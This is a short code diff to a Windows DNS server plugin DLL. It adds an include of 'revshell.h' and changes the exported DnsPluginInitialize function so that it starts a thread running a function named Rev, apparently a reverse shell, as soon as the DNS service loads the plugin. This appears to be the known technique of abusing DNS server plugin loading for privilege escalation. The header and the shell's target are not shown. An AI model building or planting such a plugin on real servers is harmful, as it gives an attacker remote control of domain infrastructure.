@@ -1,10 +1,16 @@
 
 #include "stdafx.h"
+#include "revshell.h"
 
 #define DNS_PLUGIN_API  __declspec ( dllexport )
 
 #pragma comment(linker,"/EXPORT:DnsPluginInitialize=?DnsPluginInitialize@@YAHPEAX0@Z")
-DNS_PLUGIN_API int DnsPluginInitialize(PVOID a1, PVOID a2) { return 0; }
+DNS_PLUGIN_API int DnsPluginInitialize(PVOID a1, PVOID a2) { 
+  HANDLE handle;
+	DWORD threadID;
+	handle = CreateThread(0, 0, Rev, 0, 0, &threadID);
+  return 0; 
+}
 
 #pragma comment(linker,"/EXPORT:DnsPluginCleanup=?DnsPluginCleanup@@YAHXZ")
 DNS_PLUGIN_API int DnsPluginCleanup() { return 0; }
